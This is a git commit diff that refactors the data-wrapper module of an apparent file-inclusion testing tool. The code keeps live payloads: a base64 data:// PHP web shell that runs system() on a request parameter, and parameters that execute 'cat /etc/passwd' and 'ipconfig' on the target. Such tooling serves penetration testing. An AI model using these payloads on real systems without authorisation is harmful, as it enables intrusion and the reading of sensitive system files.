4be7c287e38270f95c604bcd9821254a2657b002
Noam Rathaus <noamr@ssd-disclosure.com>
2024-06-17 11:10:24 +0300

    Multiple fixes
    1. docstring
    2. Remove unused imports
    3. Reorder import order
    4. Move to enumerate
    5. Move code so that returns instead of if / else

--- src/attacks/data.py
+++ src/attacks/data.py
@@ -1,15 +1,17 @@
+"""Test Data"""
 import urllib.parse as urlparse
+from urllib.parse import urlparse, parse_qs
+
 from src.utils.arguments import args
 from src.configs import config
-from src.utils.stats import stats
 from src.utils.encodings import encode
 from src.httpreqs.request import prepareRequest
 from src.httpreqs.request import REQUEST
 from src.utils import colors
-from urllib.parse import urlparse, parse_qs
 
 
 def test_data(url, post):
+    """Test Data"""
     if args.verbose:
         print(colors.blue("[i]") + " Testing with data wrapper...")
 
@@ -24,37 +26,41 @@ def test_data(url, post):
             "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig"
         )
 
-        for i in range(len(tests)):
-            u, reqHeaders, postTest = prepareRequest(args.param, tests[i], url, post)
+        for _, test in enumerate(tests):
+            u, reqHeaders, postTest = prepareRequest(args.param, test, url, post)
             _, br = REQUEST(u, reqHeaders, postTest, config.proxies, "RCE", "DATA")
+
             if not br:
                 return
+            
+        return
+
+    urls = []
+
+    # Logic to see if another URL parameter exists
+    # based on that append ?/& and exploit code
+    if len(parse_qs(urlparse(url).query)) == 0:
+        urls.append("?c=cat%20%2Fetc%2Fpasswd")
+        urls.append("?c=ipconfig")
     else:
-        urls = []
+        urls.append("&c=cat%20%2Fetc%2Fpasswd")
+        urls.append("&c=ipconfig")
 
-        # Logic to see if another URL parameter exists
-        # based on that append ?/& and exploit code
-        if len(parse_qs(urlparse(url).query)) == 0:
-            urls.append("?c=cat%20%2Fetc%2Fpasswd")
-            urls.append("?c=ipconfig")
-        else:
-            urls.append("&c=cat%20%2Fetc%2Fpasswd")
-            urls.append("&c=ipconfig")
+    test = (
+        "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K"
+    )
 
-        test = (
-            "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K"
+    for _, url_item in enumerate(urls):
+        url, reqHeaders, postTest = prepareRequest(args.param, test, url, post)
+        _, br = REQUEST(
+            url + encode(url_item),
+            reqHeaders,
+            postTest,
+            config.proxies,
+            "RCE",
+            "DATA",
         )
+        if not br:
+            break
 
-        for i in range(len(urls)):
-            url, reqHeaders, postTest = prepareRequest(args.param, test, url, post)
-            _, br = REQUEST(
-                url + encode(urls[i]),
-                reqHeaders,
-                postTest,
-                config.proxies,
-                "RCE",
-                "DATA",
-            )
-            if not br:
-                break
     return
